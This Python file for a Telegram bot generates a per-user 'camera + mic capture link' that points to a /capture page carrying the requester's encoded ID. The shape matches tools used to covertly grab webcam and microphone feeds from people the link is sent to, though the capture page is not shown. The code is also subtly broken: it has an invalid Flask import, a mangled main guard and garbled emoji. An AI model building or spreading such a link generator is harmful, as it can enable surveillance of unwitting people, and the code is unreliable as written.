# bot.py
import os
import base64
from flask import quote
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from utils import encode_uid

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")  # set this in .env
BASE_URL = os.getenv("BASE_URL")    # e.g. https://your-app.onrender.com (no trailing slash)

if not BOT_TOKEN or not BASE_URL:
    print("ERROR: BOT_TOKEN and BASE_URL must be set in environment (.env).")
    raise SystemExit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")


@bot.message_handler(commands=["start"])
def cmd_start(message):
    name = message.from_user.first_name or "User"
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("ߓ Generate Link", callback_data="generate_link"))
    txt = (
        f"ߑ Hello <b>{name}</b>!\n\n"
        "Press the button below to get a private camera + mic capture link (you will be asked for permission)."
    )
    bot.send_message(message.chat.id, txt, reply_markup=keyboard)


@bot.callback_query_handler(func=lambda c: c.data == "generate_link")
def handle_generate_link(call):
    uid = str(call.from_user.id)
    encoded = encode_uid(uid)
    # quote the id for URL safety though encode_uid produces base64 safe chars
    url = f"{BASE_URL}/capture?uid={quote(encoded)}"
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, f"ߔ Your capture link (private):\n{url}")


def run_bot():
    print("✅ Telegram bot started (polling)...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)


if name == "main":
    run_bot()